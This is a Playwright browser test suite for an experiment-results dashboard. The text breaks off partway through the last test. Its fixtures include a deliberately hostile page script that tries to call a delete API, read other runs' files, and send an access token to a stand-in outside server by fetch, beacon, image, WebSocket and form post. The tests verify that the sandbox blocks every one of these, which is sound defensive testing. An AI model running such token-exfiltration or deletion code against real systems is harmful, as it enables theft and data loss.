// The built dashboard in a real browser, against a temporary archive: what
// only a browser can show, like the sandbox a page runs in and the order
// responses arrive in.
import assert from "node:assert/strict";
import { existsSync } from "node:fs";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import { chromium, type Page } from "playwright";
import { UI_ASSETS, createUiServer, listenUi } from "../src/ui.js";

const PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==", "base64");

/** Every browser step and the whole test give up rather than hang. */
const STEP_MS = 10_000;
const TEST_MS = 45_000;

const ready = existsSync(join(UI_ASSETS, "index.html")) && existsSync(chromium.executablePath());

function result(runId: string, name: string, reportedAt: string) {
  return {
    runId, name, series: null, task: "Draw a page.", reportedAt, environment: "clean",
    arms: [{ label: "a", candidate: null, replaces: null }, { label: "b", candidate: null, replaces: null }],
    producers: { a: { agent: "claude", model: null, effort: null }, b: { agent: "claude", model: null, effort: null } },
    cost: {}, warnings: [], shots: null,
    judgeAgent: { agent: "claude", model: null, effort: null }, winner: "a", confidence: 0.7, totals: { a: 8, b: 6 }, margin: 2,
    scores: [{ criterion: "clarity", weight: 1, scores: { a: 8, b: 6 } }],
    referenceGuess: { arm: null, confidence: 0.5, correct: null }, summary: "A was clearer.",
  };
}

/** An output page that runs a module of its own, then tries what a hostile page would. */
const HOSTILE = `<!doctype html><title>loading</title><script type="module" src="./main.js"></script>`;
/** `away` is another server on this machine, standing in for the internet. */
const main = (away: string) => `
const attempt = async (action) => { try { const r = await action(); return String(r.status); } catch { return "blocked"; } };
const [, , token, ...rest] = decodeURIComponent(location.pathname).split("/");
const archive = "/" + rest.join("/").split("/outputs/")[0];
const read = await attempt(() => fetch("/api/experiments"));
const del = await attempt(() => fetch("/api/delete", { method: "POST", headers: { "Content-Type": "application/json", "X-Crucible": "1" }, body: JSON.stringify({ items: [[archive]] }) }));
const own = await attempt(() => fetch("./data.json"));
// The other copy of this run, through this page's own token.
const neighbour = await attempt(() => fetch("/files/" + token + archive.replace(/pages$/, "pages-copy") + "/outputs/a/data.json"));
const send = await attempt(() => fetch("${away}/fetch?" + token, { mode: "no-cors" }));
navigator.sendBeacon("${away}/beacon", token);
const image = await new Promise((done) => { const img = new Image(); img.onload = () => done("loaded"); img.onerror = () => done("blocked"); img.src = "${away}/image?" + token; });
try { new WebSocket("${away.replace("http", "ws")}/socket"); } catch {}
// Called once the results are read: a blocked form submission empties the page.
self.post = () => {
  const form = Object.assign(document.createElement("form"), { method: "post", action: "${away}/form" });
  form.append(Object.assign(document.createElement("input"), { name: "token", value: token }));
  document.body.append(form);
  form.submit();
};
document.title = JSON.stringify({ origin: self.origin, read, del, own, neighbour, send, image });
`;

/** A server that records every request it gets; none should arrive. */
async function elsewhere(t: test.TestContext): Promise<{ url: string; hits: string[] }> {
  const hits: string[] = [];
  const server = createServer((request, response) => {
    hits.push(`${request.method} ${request.url}`);
    response.end();
  });
  await new Promise<void>((done) => server.listen(0, "127.0.0.1", done));
  t.after(() => new Promise<void>((done) => server.close(() => done())));
  const address = server.address();
  return { url: `http://localhost:${typeof address === "object" && address ? address.port : 0}`, hits };
}

/**
 * A deck that shows the slide its fragment names, advances on the right
 * arrow, tries to report home when it loads, and leaves for `away` on L.
 */
const deck = (away: string) => `<!doctype html><title>deck</title><h1 id="slide"></h1><script>
const at = () => Number(location.hash.slice(2)) || 1;
const show = () => { document.getElementById("slide").textContent = "Slide " + at(); };
addEventListener("hashchange", show);
show();
addEventListener("keydown", (event) => {
  if (event.key === "ArrowRight") location.hash = "#/" + (at() + 1);
  if (event.key === "l") location.href = "${away}/leave";
});
fetch("${away}/deck").then(() => { document.title = "sent"; }, () => { document.title = "blocked"; });
</script>`;

/** A judged run of arms `labels` with these totals, the first highest winning. */
function scored(runId: string, name: string, reportedAt: string, totals: Record<string, number>, series: string | null = null) {
  const labels = Object.keys(totals);
  const ranked = [...labels].sort((x, y) => totals[y]! - totals[x]!);
  return {
    ...result(runId, name, reportedAt), series,
    arms: labels.map((label) => ({ label, candidate: null, replaces: null })),
    producers: Object.fromEntries(labels.map((label) => [label, { agent: "claude", model: null, effort: null }])),
    winner: ranked[0], totals, margin: totals[ranked[0]!]! - totals[ranked[1]!]!,
    scores: [{ criterion: "clarity", weight: 1, scores: totals }],
  };
}

/**
 * `extra` adds that many plain questions, older than the two above, for a
 * list long enough to page; `decks` adds a question whose two arms made
 * decks, captured on their second and third slides. `series` adds three
 * runs of one series, and `wide` a run of seven arms. `busy` adds a
 * question whose run still has an agent at work, and gives the run behind
 * "pages" and "pages-copy" an idle run record.
 */
async function fixture(t: test.TestContext, extra = 0, decks = false, { series = false, wide = false, busy = false } = {}) {
  const away = await elsewhere(t);
  const base = await mkdtemp(join(tmpdir(), "crucible-dashboard-"));
  t.after(() => rm(base, { recursive: true, force: true }));
  const archiveRoot = join(base, "archive");
  const runsRoot = join(base, "runs");
  // One run archived twice: two questions that once shared a key.
  for (const [name, reportedAt] of [["pages", "2026-01-01T00:00:00Z"], ["pages-copy", "2026-02-01T00:00:00Z"]] as const) {
    const entry = join(archiveRoot, name);
    await mkdir(join(entry, "outputs", "a"), { recursive: true });
    await writeFile(join(entry, "result.json"), JSON.stringify(result("ab-00000001", `Question ${name}`, reportedAt)));
    await writeFile(join(entry, "report.html"), "<p>report</p>");
    await writeFile(join(entry, "outputs", "a", "preview.png"), PNG);
    await writeFile(join(entry, "outputs", "a", "index.html"), HOSTILE);
    await writeFile(join(entry, "outputs", "a", "main.js"), main(away.url));
    await writeFile(join(entry, "outputs", "a", "data.json"), "{}");
  }
  for (let i = 1; i <= extra; i++) {
    const n = String(i).padStart(2, "0");
    const entry = join(archiveRoot, `extra-${n}`);
    await mkdir(entry, { recursive: true });
    await writeFile(join(entry, "result.json"), JSON.stringify(result(`ab-100000${n}`, `Extra ${n}`, `2025-12-${n}T00:00:00Z`)));
  }
  if (decks) {
    const entry = join(archiveRoot, "decks");
    const shot = (artifact: string, desktop: string) => ({ page: "Second slide", artifact, desktop, phone: null });
    const shots = { arms: { a: [shot("deck.html#/2", "shots/a.png")], b: [shot("talk.html#/3", "shots/b.png")] } };
    await mkdir(join(entry, "shots"), { recursive: true });
    await writeFile(join(entry, "result.json"), JSON.stringify({ ...result("ab-00000002", "Decks", "2026-03-01T00:00:00Z"), shots }));
    for (const [label, files] of [["a", ["deck.html", "appendix.html"]], ["b", ["talk.html"]]] as const) {
      await mkdir(join(entry, "outputs", label), { recursive: true });
      await writeFile(join(entry, "shots", `${label}.png`), PNG);
      for (const file of files) await writeFile(join(entry, "outputs", label, file), deck(away.url));
    }
  }
  if (series) {
    const runs = [["2026-04-01T00:00:00Z", { a: 7.5, b: 9 }], ["2026-04-02T00:00:00Z", { a: 7.2, b: 8.6 }], ["2026-04-03T00:00:00Z", { a: 8.1, b: 7.9 }]] as const;
    for (const [i, [reportedAt, totals]] of runs.entries()) {
      const entry = join(archiveRoot, `series-${i}`);
      await mkdir(entry, { recursive: true });
      await writeFile(join(entry, "result.json"), JSON.stringify(scored(`ab-2000000${i}`, "A series", reportedAt, { ...totals }, "the-series")));
    }
  }
  if (wide) {
    const entry = join(archiveRoot, "wide");
    await mkdir(entry, { recursive: true });
    const totals = Object.fromEntries(["a", "b", "c", "d", "e", "f", "g"].map((label, i) => [label, 6 + i * 0.3]));
    await writeFile(join(entry, "result.json"), JSON.stringify(scored("ab-30000000", "Seven arms", "2026-05-01T00:00:00Z", totals)));
  }
  await mkdir(runsRoot, { recursive: true });
  if (busy) {
    const entry = join(archiveRoot, "busy");
    await mkdir(entry, { recursive: true });
    await writeFile(join(entry, "result.json"), JSON.stringify(result("ab-40000000", "Busy question", "2026-06-01T00:00:00Z")));
    const now = new Date().toISOString();
    for (const [runId, state, producer] of [
      ["ab-40000000", "running", { state: "running", toolCalls: 1, pid: process.pid, startedAt: now, lastActivityAt: now }],
      ["ab-00000001", "reported", { state: "complete", toolCalls: 3 }],
    ] as const) {
      await mkdir(join(runsRoot, runId));
      await writeFile(join(runsRoot, runId, "state.json"), JSON.stringify({ runId, state, createdAt: now, updatedAt: now, producers: { p1: producer } }));
      await writeFile(join(runsRoot, runId, "resolved-config.json"), JSON.stringify({ name: runId, arms: [{ label: "a" }], producer: { timeoutMs: 600_000 }, judge: { timeoutMs: 600_000 } }));
    }
  }
  const server = createUiServer({ archiveRoot, runsRoot, key: KEY });
  const port = await listenUi(server, 0);
  t.after(() => new Promise<void>((done) => server.close(() => done())));
  const url = `http://127.0.0.1:${port}/`;
  const { files } = await (await fetch(`${url}api/experiments`, { headers: { cookie: `crucible_key=${KEY}` }, signal: AbortSignal.timeout(STEP_MS) })).json() as { files: Record<string, string> };
  return { archiveRoot, runsRoot, url, files, away };
}

/** The key the test dashboards sign in with. */
const KEY = "b".repeat(64);

/** A browser signed in to every test dashboard: a cookie belongs to the host, whatever the port. */
async function newPage(t: test.TestContext, options: { colorScheme?: "light" | "dark" } = {}): Promise<Page> {
  const instance = await chromium.launch({ timeout: STEP_MS });
  t.after(() => instance.close());
  const context = await instance.newContext(options);
  await context.addCookies([{ name: "crucible_key", value: KEY, domain: "127.0.0.1", path: "/", httpOnly: true, sameSite: "Strict" }]);
  const page = await context.newPage();
  page.setDefaultTimeout(STEP_MS);
  return page;
}

test("the dashboard distinguishes waiting workers from agents that have started", { skip: !ready, timeout: TEST_MS }, async (t) => {
  const { url, runsRoot } = await fixture(t);
  const dir = join(runsRoot, "ab-queued");
  const now = new Date().toISOString();
  await mkdir(dir);
  await writeFile(join(dir, "resolved-config.json"), JSON.stringify({ name: "Queued test", arms: [{ label: "a" }], producer: { timeoutMs: 60_000 }, judge: null }));
  const state = { runId: "ab-queued", state: "running", createdAt: now, updatedAt: now, producers: { p1: { state: "running", pid: process.pid, toolCalls: 0 } } };
  await writeFile(join(dir, "state.json"), JSON.stringify(state));
  const page = await newPage(t);
  await page.goto(url);
  const card = page.getByRole("article", { name: "Queued test" });
  await card.getByText("Waiting or preparing", { exact: true }).waitFor();
  assert.equal(await card.locator(".dot.pulse").count(), 0);
  assert.equal(await card.locator("tbody tr td").nth(2).textContent(), "—");

  Object.assign(state.producers.p1, { startedAt: now, lastActivityAt: now });
  await writeFile(join(dir, "state.json"), JSON.stringify(state));
  await page.reload();
  await card.getByText("Working", { exact: true }).waitFor();
  assert.equal(await card.locator(".dot.pulse").count(), 1);
  assert.notEqual(await card.locator("tbody tr td").nth(2).textContent(), "—");
});

test("the dashboard lists both copies of one run, shows their captures, and opens each question", { skip: !ready, timeout: TEST_MS }, async (t) => {
  const { url } = await fixture(t);
  const page = await newPage(t);
  await page.goto(url);
  const rows = page.locator("table.results a.row-link");
  await rows.first().waitFor();
  assert.deepEqual(await rows.locator(".title").allTextContents(), ["Question pages-copy", "Question pages"]);
  const covers = page.locator("table.results img");
  await page.waitForFunction(() => [...document.querySelectorAll("table.results img")].every((img) => (img as HTMLImageElement).naturalWidth > 0));
  assert.equal(await covers.count(), 2);
  await rows.nth(1).click();
  await page.getByRole("heading", { name: "Question pages" }).first().waitFor();
});

test("a malformed hash opens the list instead of breaking the page", { skip: !ready, timeout: TEST_MS }, async (t) => {
  const { url } = await fixture(t);
  const page = await newPage(t);
  const errors: string[] = [];
  page.on("pageerror", (error) => errors.push(error.message));
  await page.goto(`${url}#/q/%E0%A4%A`);
  await page.locator("table.results a.row-link").first().waitFor();
  assert.deepEqual(errors, []);
});

test("a refresh that answers late cannot bring back what a newer one removed", { skip: !ready, timeout: TEST_MS }, async (t) => {
  const { url } = await fixture(t);
  const page = await newPage(t);
  let calls = 0;
  let releaseFirst!: () => void;
  const firstHeld = new Promise<void>((done) => { releaseFirst = done; });
  await page.route("**/api/experiments", async (route) => {
    const call = ++calls;
    const response = await route.fetch();
    const snapshot = await response.json();
    if (call === 1) {
      // The stale answer: taken before a deletion, so it still lists a ghost.
      snapshot.experiments.questions.push({ ...snapshot.experiments.questions[0], key: "ghost", title: "Ghost question" });
      await firstHeld;
    }
    await route.fulfill({ response, json: snapshot });
  });
  await page.goto(url, { waitUntil: "commit" });
  await page.waitForFunction(() => document.readyState === "complete");
  await page.evaluate(() => document.dispatchEvent(new Event("visibilitychange")));
  await page.locator("table.results a.row-link").first().waitFor();
  releaseFirst();
  await page.waitForTimeout(300);
  assert.equal(calls, 2);
  assert.equal(await page.getByText("Ghost question").count(), 0);
});

test("an output page runs its own scripts in an opaque origin, reads only its own entry, and can send nothing away", { skip: !ready, timeout: TEST_MS }, async (t) => {
  const { archiveRoot, url, files, away } = await fixture(t);
  const page = await newPage(t);
  const entry = join(archiveRoot, "pages");
  await page.goto(`${url}${files[entry]}${join(entry, "outputs", "a")}/`);
  await page.waitForFunction(() => document.title.startsWith("{"));
  assert.deepEqual(JSON.parse(await page.title()), { origin: "null", read: "blocked", del: "blocked", own: "200", neighbour: "blocked", send: "blocked", image: "blocked" });
  await page.evaluate("post()");
  await page.waitForTimeout(500);
  assert.deepEqual(away.hits, []);
  assert.ok(existsSync(entry));
});

test("the list pages from controls above it and keeps its page in the address", { skip: !ready, timeout: TEST_MS }, async (t) => {
  const { url } = await fixture(t, 23);
  const page = await newPage(t);
  const range = page.locator(".pager .range");
  const titles = page.locator("table.results .title");
  await page.goto(url);
  await titles.first().waitFor();
  assert.equal(await range.textContent(), "1–20 of 25");
  assert.equal(await titles.count(), 20);
  // The pager sits above the list, not below it.
  assert.ok(await page.evaluate(() => document.querySelector(".pager")!.compareDocumentPosition(document.querySelector("table.results")!) & Node.DOCUMENT_POSITION_FOLLOWING));

  await page.getByRole("button", { name: "Next page" }).press("Enter");
  assert.equal(await range.textContent(), "21–25 of 25");
  assert.deepEqual(await titles.allTextContents(), ["Extra 05", "Extra 04", "Extra 03", "Extra 02", "Extra 01"]);
  assert.equal(await page.evaluate(() => location.hash), "#/?page=2");
  // At the end the button stays focused and says why it does nothing.
  const next = page.getByRole("button", { name: "Next page" });
  await next.press("Enter");
  assert.equal(await next.getAttribute("aria-disabled"), "true");
  assert.equal(await range.textContent(), "21–25 of 25");

  await page.reload();
  await titles.first().waitFor();
  assert.equal(await range.textContent(), "21–25 of 25");
  await titles.first().click();
  await page.getByRole("heading", { name: "Extra 05" }).first().waitFor();
  await page.goBack();
  await page.locator(".pager").waitFor();
  assert.equal(await range.textContent(), "21–25 of 25");

  // A search pages its own matches from the first page.
  await page.getByLabel("Search results").fill("extra");
  assert.equal(await range.textContent(), "1–20 of 23");
  assert.equal(await page.evaluate(() => location.hash), "#/?q=extra");
  await page.getByLabel("Search results").fill("extra 1");
  assert.equal(await page.locator(".pager").count(), 0);
  assert.equal(await titles.count(), 12); // 01, 10–19 and 21: each word matches on its own

  // An address from a longer list shows the last page there is.
  await page.goto(`${url}#/?page=9&size=50`);
  await page.getByLabel("Search results").fill("");
  assert.equal(await range.textContent(), "1–25 of 25");
  assert.equal(await page.getByRole("button", { name: "Next page" }).count(), 0);
});

test("the live viewer opens Markdown with headings, tables and safe source text", { skip: !ready, timeout: TEST_MS }, async (t) => {
  const { archiveRoot, url } = await fixture(t);
  await writeFile(join(archiveRoot, "pages", "outputs", "a", "answer.md"), "# Readable answer\n\n| Check | Result |\n| --- | --- |\n| Sum | Passed |\n\n<script>document.title = 'unsafe'</script>");
  const page = await newPage(t);
  await page.goto(url);
  const rows = page.locator("table.results a.row-link");
  await rows.first().waitFor();
  const question = await rows.nth(1).getAttribute("href");
  assert.ok(question);
  await page.goto(`${url}${question}/ab-00000001/view/a/answer.md`);
  const frame = page.frameLocator("dialog.viewer iframe");
  await frame.getByRole("heading", { name: "Readable answer", level: 1 }).waitFor();
  assert.equal(await frame.getByRole("cell", { name: "Passed" }).textContent(), "Passed");
  assert.match(await frame.locator("main").textContent() ?? "", /<script>document.title/);
  assert.equal(await frame.locator("body").evaluate((body) => body.scrollWidth <= body.clientWidth), true);
  await page.keyboard.press("Escape");
  await page.locator("dialog.viewer").waitFor({ state: "detached" });
});

test("the theme follows the system until chosen, and a chosen theme is painted from the first frame", { skip: !ready, timeout: TEST_MS }, async (t) => {
  const { url } = await fixture(t);
  const page = await newPage(t, { colorScheme: "light" });
  const theme = () => page.evaluate(() => document.documentElement.dataset.theme);
  await page.goto(url);
  assert.equal(await theme(), "light");
  await page.emulateMedia({ colorScheme: "dark" });
  await page.waitForFunction(() => document.documentElement.dataset.theme === "dark");

  // One button opens the three choices.
  const choose = async (name: string) => {
    await page.getByRole("button", { name: "Theme" }).click();
    await page.getByRole("menuitemradio", { name }).click();
  };
  await choose("Light");
  assert.equal(await theme(), "light");
  await page.addInitScript(() => {
    new MutationObserver((_, observer) => {
      if (!document.body) return;
      (window as unknown as { firstTheme?: string }).firstTheme = document.documentElement.dataset.theme ?? "unset";
      observer.disconnect();
    }).observe(document, { childList: true, subtree: true });
  });
  await page.reload();
  assert.equal(await page.evaluate(() => (window as unknown as { firstTheme?: string }).firstTheme), "light");
  await page.getByRole("button", { name: "Theme" }).click();
  assert.equal(await page.getByRole("menuitemradio", { name: "Light" }).getAttribute("aria-checked"), "true");
  await page.keyboard.press("Escape");

  await choose("System");
  assert.equal(await theme(), "dark");
});

test("a capture opens its arm's page live: keys reach the page, arms switch on the same page, Escape closes, and the page reaches nothing", { skip: !ready, timeout: TEST_MS }, async (t) => {
  const { url, away } = await fixture(t, 0, true);
  const page = await newPage(t);
  const viewer = page.locator("dialog.viewer");
  const frame = (arm: string) => page.frames().find((candidate) => candidate.url().includes(`/outputs/${arm}/`))!;
  /** Once the viewer has handed the frame focus, the page shows this slide. */
  const showing = async (arm: string, text: string) => {
    await page.waitForFunction(() => document.activeElement?.tagName === "IFRAME");
    await frame(arm).getByText(text, { exact: true }).waitFor();
  };
  await page.goto(`${url}#/q/ab-00000002/ab-00000002`);
  await page.locator(".compare a.shot").first().click();
  await viewer.waitFor();
  assert.equal(await page.evaluate(() => location.hash), "#/q/ab-00000002/ab-00000002/view/a/deck.html%23%2F2");
  await showing("a", "Slide 2");
  // The viewer's bar spans the window: no shared class may squeeze it.
  assert.ok(await viewer.locator("header.bar").evaluate((bar) => bar.getBoundingClientRect().width > 600));
  assert.deepEqual(await viewer.getByLabel("Page").locator("option").allTextContents(), ["deck.html", "appendix.html"], "every page, the captured one first");

  await page.keyboard.press("ArrowRight");
  await showing("a", "Slide 3");

  // The other arm's capture of the same page, its own file and slide.
  await viewer.getByRole("button", { name: "Next arm" }).click();
  assert.equal(await page.evaluate(() => location.hash), "#/q/ab-00000002/ab-00000002/view/b/talk.html%23%2F3");
  await showing("b", "Slide 3");

  // Escape inside the page closes the viewer, back to the question it came from.
  await viewer.getByText(/kept this page from reaching localhost/).waitFor();
  assert.equal(await frame("b").title(), "blocked", "its report home was refused, and the viewer said so");
  await page.keyboard.press("Escape");
  await viewer.waitFor({ state: "detached" });
  assert.equal(await page.evaluate(() => location.hash), "#/q/ab-00000002/ab-00000002");

  // Leaving the frame for another site goes nowhere; Escape from the viewer's own controls still closes it.
  await page.goForward();
  await showing("b", "Slide 3");
  await page.keyboard.press("l");
  await page.waitForTimeout(500);
  assert.deepEqual(away.hits, []);
  await viewer.getByRole("button", { name: "Reload" }).focus();
  await page.keyboard.press("Escape");
  await viewer.waitFor({ state: "detached" });

  // A viewer address opens on its own and closes in place.
  await page.goto(`${url}#/q/ab-00000002/ab-00000002/view/b/talk.html?phone`);
  await viewer.waitFor();
  assert.equal(await viewer.getByRole("button", { name: "Phone" }).getAttribute("aria-pressed"), "true");
  await viewer.getByRole("button", { name: "Close the viewer" }).click();
  await viewer.waitFor({ state: "detached" });
  assert.equal(await page.evaluate(() => location.hash), "#/q/ab-00000002/ab-00000002");
});

test("the table filters, sorts from its headers, and keeps both in the address", { skip: !ready, timeout: TEST_MS }, async (t) => {
  const { url } = await fixture(t, 0, false, { series: true, wide: true });
  const page = await newPage(t);
  const titles = page.locator("table.results .title");
  await page.goto(url);
  await titles.first().waitFor();
  assert.deepEqual(await titles.allTextContents(), ["Seven arms", "A series", "Question pages-copy", "Question pages"], "newest first");

  await page.getByRole("button", { name: /^Series/ }).click();
  assert.deepEqual(await titles.allTextContents(), ["A series"]);
  assert.equal(await page.evaluate(() => location.hash), "#/?filter=series");
  await page.getByRole("button", { name: /^All/ }).click();

  const arms = page.getByRole("columnheader", { name: "Arms" });
  await arms.getByRole("button").click();
  assert.equal(await arms.getAttribute("aria-sort"), "descending");
  assert.equal(await titles.first().textContent(), "Seven arms");
  await page.getByRole("columnheader", { name: "Question" }).getByRole("button").click();
  assert.deepEqual(await titles.allTextContents(), ["A series", "Question pages", "Question pages-copy", "Seven arms"], "names A to Z first");
  assert.equal(await page.evaluate(() => location.hash), "#/?sort=title&order=asc");
  await page.reload();
  await titles.first().waitFor();
  assert.equal(await titles.first().textContent(), "A series");

  // A margin on a series is its lead on mean totals, drawn to the list's scale.
  await page.getByRole("columnheader", { name: "Margin" }).getByRole("button").click();
  assert.equal((await page.locator("table.results tbody tr").first().locator(".c-margin").textContent())?.trim(), "+2.00");
});

test("j and k move through the list, Enter opens a result, and Esc comes back to the same row", { skip: !ready, timeout: TEST_MS }, async (t) => {
  const { url } = await fixture(t, 23);
  const page = await newPage(t);
  const focused = () => page.evaluate(() => (document.activeElement as HTMLElement | null)?.querySelector(".title")?.textContent ?? null);
  await page.goto(url);
  await page.locator("table.results a.row-link").first().waitFor();
  await page.keyboard.press("j");
  await page.keyboard.press("j");
  assert.equal(await focused(), "Question pages");
  await page.keyboard.press("k");
  assert.equal(await focused(), "Question pages-copy");
  // Past the last row of a page, j turns to the next one.
  for (let i = 0; i < 20; i++) await page.keyboard.press("j");
  assert.equal(await page.locator(".pager .range").textContent(), "21–25 of 25");
  assert.equal(await focused(), "Extra 05");

  await page.keyboard.press("Enter");
  await page.getByRole("heading", { name: "Extra 05" }).first().waitFor();
  // Confidence, judge and date live once, in the run's facts, not in the verdict.
  assert.equal((await page.locator(".verdict").textContent())?.trim(), "a wins by 2.00");
  await page.keyboard.press("Escape");
  await page.locator("table.results").waitFor();
  assert.equal(await page.evaluate(() => location.hash), "#/?page=2");
  assert.equal(await focused(), "Extra 05");

  await page.keyboard.press("?");
  await page.getByRole("dialog", { name: "Keyboard shortcuts" }).waitFor();
  await page.keyboard.press("Escape");
  await page.getByRole("dialog", { name: "Keyboard shortcuts" }).waitFor({ state: "hidden" });
});

test("a series shows its runs with the mean strongest, and a dot plot of score by arm", { skip: !ready, timeout: TEST_MS }, async (t) => {
  const { url } = await fixture(t, 0, false, { series: true });
  const page = await newPage(t);
  await page.goto(`${url}#/q/the-series`);
  const plot = page.getByRole("img", { name: /^Score by arm across 3 runs/ });
  await plot.waitFor();
  assert.match(await plot.getAttribute("aria-label") ?? "", /a: mean 7\.60; b: mean 8\.50, leading/);
  assert.equal(await plot.locator("circle.dot").count(), 6, "a dot per run per arm");
  assert.equal(await plot.locator("circle.ring").count(), 2, "the run shown is ringed in each arm");
  assert.equal(await plot.locator("line.mean").count(), 2);
  assert.match(await page.locator(".verdict").textContent() ?? "", /b wins 2 of 3 judged runs\s*·\s*by 0\.90 on mean total/);
  assert.equal(await page.locator("tr.mean td").first().textContent(), "Mean");
  assert.equal(await page.locator("tr.mean td").first().evaluate((cell) => getComputedStyle(cell).fontWeight), "600");

  // j steps to the next run, in place.
  const shown = () => page.locator("tr.current a.pick").textContent();
  const first = await shown();
  await page.keyboard.press("j");
  await page.waitForFunction((before) => document.querySelector("tr.current a.pick")?.textContent !== before, first);
  assert.notEqual(await shown(), first);
});

test("seven arms scroll sideways under pinned headers, four at a time", { skip: !ready, timeout: TEST_MS }, async (t) => {
  const { url } = await fixture(t, 0, false, { wide: true });
  const page = await newPage(t);
  await page.setViewportSize({ width: 1440, height: 900 });
  await page.goto(`${url}#/q/ab-30000000`);
  const range = page.locator(".compare .range");
  await range.waitFor();
  assert.equal(await range.textContent(), "Arms 1–4 of 7");
  const layout = () => page.evaluate(() => {
    const body = document.querySelector(".compare .body")!;
    const heads = document.querySelector(".compare .heads")!;
    const tops = [...document.querySelectorAll(".compare .body .arm")].map((arm) => Math.round(arm.getBoundingClientRect().top));
    return { overflows: body.scrollWidth > body.clientWidth, oneRow: new Set(tops).size === 1, body: body.scrollLeft, heads: heads.scrollLeft };
  });
  const before = await layout();
  assert.ok(before.overflows && before.oneRow, "one row that scrolls, not a wrapped grid");
  await page.getByRole("button", { name: "Show later arms" }).click();
  await page.waitForFunction(() => document.querySelector(".compare .range")?.textContent === "Arms 2–5 of 7");
  const after = await layout();
  assert.ok(after.body > 0);
  assert.equal(after.heads, after.body, "the headers follow the columns");
  assert.equal(await page.locator(".compare .heads .head").count(), 7);
  // The criteria compare every arm, the best of each row marked.
  assert.equal(await page.locator("table.criteria tr.sum td.lead").textContent(), "7.80");
  assert.equal(await page.locator("table.criteria tr.delta td").last().textContent(), "+1.80");
});

test("live, synced decks turn together: from the page's arrows, and from an arrow pressed in one of them", { skip: !ready, timeout: TEST_MS }, async (t) => {
  const { url } = await fixture(t, 0, true);
  const page = await newPage(t);
  const frame = (arm: string) => page.frames().find((candidate) => candidate.url().includes(`/outputs/${arm}/`))!;
  const slide = (arm: string, text: string) => frame(arm).getByText(text, { exact: true }).waitFor();
  await page.goto(`${url}#/q/ab-00000002/ab-00000002`);
  await page.getByRole("button", { name: "Live", exact: true }).click();
  await page.waitForFunction(() => document.querySelectorAll(".compare iframe").length === 2);
  await slide("a", "Slide 2");
  await slide("b", "Slide 3");

  await page.keyboard.press("ArrowRight");
  await slide("a", "Slide 3");
  await slide("b", "Slide 4");

  // Pressed inside one deck, the other follows.
  await frame("a").locator("#slide").click();
  await page.keyboard.press("ArrowRight");
  await slide("a", "Slide 4");
  await slide("b", "Slide 5");

  // Unsynced, each turns on its own.
  await page.getByLabel("Sync pages").uncheck();
  await frame("a").locator("#slide").click();
  await page.keyboard.press("ArrowRight");
  await slide("a", "Slide 5");
  await page.waitForTimeout(300);
  assert.equal(await frame("b").locator("#slide").textContent(), "Slide 5");
});

test("the date filter keeps rows by their newest run, combines with search, lives in the address, and clears", { skip: !ready, timeout: TEST_MS }, async (t) => {
  const { url } = await fixture(t, 23, false, { series: true, wide: true });
  const page = await newPage(t);
  const titles = page.locator("table.results .title");
  const dates = page.getByRole("button", { name: /^Newest run date/ });
  const hash = () => page.evaluate(() => location.hash);
  await page.goto(`${url}#/?page=2`);
  await titles.first().waitFor();

  // Keyboard: the button opens its panel on the checked preset, which says what it filters on.
  await dates.focus();
  await page.keyboard.press("Enter");
  const panel = page.getByRole("dialog", { name: /Newest run date/ });
  await panel.getByText("By each question's newest run").waitFor();
  // Native popover focus can precede the toggle handler, which sets focus again.
  await page.waitForFunction(() => document.querySelector('button[aria-label^="Newest run date"]')?.getAttribute("aria-expanded") === "true"
    && document.activeElement?.textContent?.trim() === "Any time");
  await page.keyboard.press("ArrowDown");
  await page.keyboard.press("Enter");
  assert.equal(await hash(), "#/?date=7d", "a new date range starts at the first page");
  assert.equal(await dates.textContent().then((text) => text?.trim()), "Last 7 days");
  await page.getByText("No results, last 7 days.").waitFor();

  // A custom range: whole days, either end open.
  await dates.click();
  await panel.getByLabel("From", { exact: true }).fill("2026-01-15");
  await panel.getByLabel("To", { exact: true }).fill("2026-04-30");
  await page.keyboard.press("Escape");
  assert.deepEqual(await titles.allTextContents(), ["A series", "Question pages-copy"]);
  assert.equal(await hash(), "#/?date=custom&from=2026-01-15&to=2026-04-30");
  assert.equal(await dates.textContent().then((text) => text?.trim()), "Jan 15 – Apr 30");
  assert.equal(await page.locator(".section-head .count").textContent(), "2 of 27");

  // With a search, both narrow the list, and a reload keeps both.
  await page.getByLabel("Search results").fill("series");
  assert.deepEqual(await titles.allTextContents(), ["A series"]);
  assert.equal(await hash(), "#/?q=series&date=custom&from=2026-01-15&to=2026-04-30");
  await page.reload();
  await titles.first().waitFor();
  assert.deepEqual(await titles.allTextContents(), ["A series"]);
  assert.equal(await page.getByRole("button", { name: /^Series/ }).textContent(), "Series 1");

  // The clear button drops the dates, keeps the search, and hands focus back.
  await page.getByRole("button", { name: "Clear the date filter" }).click();
  assert.equal(await hash(), "#/?q=series");
  assert.equal(await page.evaluate(() => document.activeElement?.getAttribute("aria-label")), "Newest run date: Any time");
  assert.equal(await page.getByRole("button", { name: "Clear the date filter" }).count(), 0);
});

test("rows are selected one at a time, in a shift range, by page, or all that match, and a filter change clears them", { skip: !ready, timeout: TEST_MS }, async (t) => {
  const { url } = await fixture(t, 23);
  const page = await newPage(t);
  const bar = page.getByRole("group", { name: "Selection" });
  const picked = () => bar.locator(".picked").textContent();
  const box = (title: string) => page.getByRole("checkbox", { name: `Select ${title}` });
  await page.goto(url);
  await page.locator("table.results a.row-link").first().waitFor();

  await page.getByRole("checkbox", { name: "Select every result on this page" }).check();
  assert.equal(await picked(), "20 selected");
  await bar.getByRole("button", { name: "Select all 25" }).click();
  assert.equal(await picked(), "25 selected");
  // Paging keeps the selection.
  await page.getByRole("button", { name: "Next page" }).click();
  assert.ok(await box("Extra 01").isChecked());
  assert.equal(await page.getByRole("checkbox", { name: "Select every result on this page" }).isChecked(), true);
  await bar.getByRole("button", { name: "Clear" }).click();
  assert.equal(await bar.count(), 0);

  // Shift extends from the last box ticked.
  await page.getByRole("button", { name: "Previous page" }).click();
  await box("Extra 20").click();
  await box("Extra 17").click({ modifiers: ["Shift"] });
  assert.equal(await picked(), "4 selected");
  assert.equal(await page.getByRole("checkbox", { name: "Select every result on this page" }).evaluate((input) => (input as HTMLInputElement).indeterminate), true);

  // x toggles the keyboard's row; Esc clears.
